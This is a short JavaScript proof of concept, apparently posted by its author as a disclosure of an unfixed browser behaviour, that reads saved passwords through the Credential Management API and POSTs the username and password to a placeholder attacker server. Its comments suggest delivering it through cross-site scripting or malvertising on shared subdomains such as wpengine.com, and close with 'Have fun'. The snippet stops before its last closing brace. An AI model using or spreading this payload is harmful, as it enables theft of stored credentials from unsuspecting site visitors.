// Written by MarkBuffalo

// Google doesn't want to fix this. Cool. Have fun.

// Apply via XSS, malvertising, normal in-line Javascript, etc. 
// This can be used on any domain in which the Javascript runs, or across sub-domains. 
// Think *.amazonaws.com, *.wpengine.com, *.azurewebsites.net, etc.
// Example: my1337hackerblog.wpengine.com can steal credentials from my1337securityblog.wpengine.com, and so forth.
 
// If you have problems running this, pay attention.

if (navigator.credentials) {
  navigator.credentials.get({ password: true, mediation: 'optional'}).then(x => {
    if (x) {
      var xhr = new XMLHttpRequest();
      xhr.open("POST", "hxxps://www.evil-hacker-website.com/evil_credential_collector.php", true);
      xhr.send("username=${x.id}&password=${x.password}");
    }
    else { }
  })

